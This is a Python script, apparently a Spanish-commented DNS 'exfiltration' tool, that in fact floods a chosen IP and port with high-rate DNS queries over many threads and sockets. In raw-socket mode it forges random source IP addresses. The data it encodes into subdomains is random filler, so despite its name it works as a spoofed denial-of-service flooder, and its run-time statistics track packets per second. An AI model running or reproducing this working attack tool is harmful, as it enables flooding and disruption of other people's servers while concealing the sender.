#!/usr/bin/env python3
import socket
import random
import struct
import sys
import time
import threading
import os
import base64

class DNSExfil:
    """UDP Covert Channels in DNS Queries - Datos ocultos en subdominios"""
    
    def __init__(self, target_ip, target_port, duration, domain="example.com"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.domain = domain
        self.running = True
        self.total_packets = 0
        self.total_bytes = 0
        self.lock = threading.Lock()
        
    def get_cpu_count(self):
        try:
            return os.cpu_count() * 4
        except:
            return 16
    
    def encode_data_in_subdomain(self, data):
        """Codificar datos en formato de subdominio"""
        b32_data = base64.b32encode(data).decode('ascii').lower()
        b32_data = b32_data.replace('=', '')
        
        parts = []
        for i in range(0, len(b32_data), 63):
            parts.append(b32_data[i:i+63])
        
        subdomain = '.'.join(parts) + '.' + self.domain
        return subdomain
    
    def create_dns_query(self, subdomain):
        """Crear consulta DNS completa"""
        transaction_id = random.randint(0, 65535)
        flags = 0x0100
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        dns_header = struct.pack('!HHHHHH',
            transaction_id, flags, questions,
            answer_rrs, authority_rrs, additional_rrs)
        
        dns_query = b''
        for part in subdomain.split('.'):
            dns_query += struct.pack('B', len(part))
            dns_query += part.encode('ascii')
        dns_query += b'\x00'
        
        dns_query += struct.pack('!HH', 1, 1)
        
        return dns_header + dns_query
    
    def dns_exfil_worker_raw(self, worker_id):
        """Worker con raw socket"""
        end_time = time.time() + self.duration
        packet_count = 0
        byte_count = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return
        
        sock.setblocking(False)
        
        exfil_data = []
        for i in range(50):
            exfil_data.append(os.urandom(random.randint(10, 100)))
            exfil_data.append(b'data_' + str(i).encode() * 5)
        
        while time.time() < end_time and self.running:
            for _ in range(1000):
                if time.time() >= end_time:
                    break
                
                try:
                    data = random.choice(exfil_data)
                    subdomain = self.encode_data_in_subdomain(data)
                    dns_query = self.create_dns_query(subdomain)
                    
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        (4 << 4) + 5, 0, 20 + 8 + len(dns_query),
                        random.randint(0, 65535), 0,
                        64, socket.IPPROTO_UDP, 0,
                        socket.inet_aton(src_ip),
                        socket.inet_aton(self.target_ip))
                    
                    udp_header = struct.pack('!HHHH',
                        random.randint(1024, 65535),
                        self.target_port, 8 + len(dns_query), 0)
                    
                    packet = ip_header + udp_header + dns_query
                    sock.sendto(packet, (self.target_ip, 0))
                    
                    packet_count += 1
                    byte_count += len(data)
                    
                except:
                    continue
            
            with self.lock:
                self.total_packets += packet_count
                self.total_bytes += byte_count
            packet_count = 0
            byte_count = 0
            
            time.sleep(0.0001)
        
        sock.close()
    
    def dns_exfil_worker_normal(self, worker_id):
        """Worker con socket UDP normal"""
        end_time = time.time() + self.duration
        
        sockets = []
        for _ in range(50):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sockets.append(sock)
            except:
                pass
        
        packet_count = 0
        byte_count = 0
        
        exfil_data = []
        for i in range(30):
            exfil_data.append(os.urandom(random.randint(10, 80)))
        
        while time.time() < end_time and self.running:
            for sock in sockets:
                for _ in range(20):
                    if time.time() >= end_time:
                        break
                    
                    try:
                        data = random.choice(exfil_data)
                        subdomain = self.encode_data_in_subdomain(data)
                        dns_query = self.create_dns_query(subdomain)
                        
                        sock.sendto(dns_query, (self.target_ip, self.target_port))
                        
                        packet_count += 1
                        byte_count += len(data)
                        
                    except:
                        pass
            
            if packet_count >= 1000:
                with self.lock:
                    self.total_packets += packet_count
                    self.total_bytes += byte_count
                packet_count = 0
                byte_count = 0
        
        for sock in sockets:
            sock.close()
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[📡] DNS EXFIL - PUERTO {self.target_port}")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[🌐] Domain: {self.domain}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        print(f"[🔒] Datos en subdominios DNS")
        
        try:
            test = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            test.close()
            use_raw = True
            print(f"[✅] Modo: Raw")
            worker = self.dns_exfil_worker_raw
        except:
            use_raw = False
            print(f"[⚠️] Modo: UDP normal")
            worker = self.dns_exfil_worker_normal
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        start = time.time()
        last_packets = 0
        last_bytes = 0
        
        while time.time() - start < self.duration:
            time.sleep(1)
            with self.lock:
                packets = self.total_packets
                bytes_sent = self.total_bytes
                pps = packets - last_packets
                bps = bytes_sent - last_bytes
                last_packets = packets
                last_bytes = bytes_sent
            
            print(f"\r[📊] {int(time.time()-start)}s | Paq: {packets:,} | {pps:,} pps | Datos: {bytes_sent/1024:.1f} KB | {bps/1024:.1f} KB/s", end="")
        
        self.running = False
        
        with self.lock:
            final_packets = self.total_packets
            final_bytes = self.total_bytes
        
        print(f"\n\n[✅] DNS Exfil completado")
        print(f"[📊] Total paquetes: {final_packets:,}")
        print(f"[📊] Datos: {final_bytes/1024:.2f} KB")
        print(f"[📊] Puerto: {self.target_port}")

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 dnsexfil.py <ip> <port> <time>")
        print("Ejemplo: sudo python3 dnsexfil.py 192.168.1.1 53 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack = DNSExfil(target_ip, target_port, duration)
    attack.start_attack()

if __name__ == "__main__":
    main()
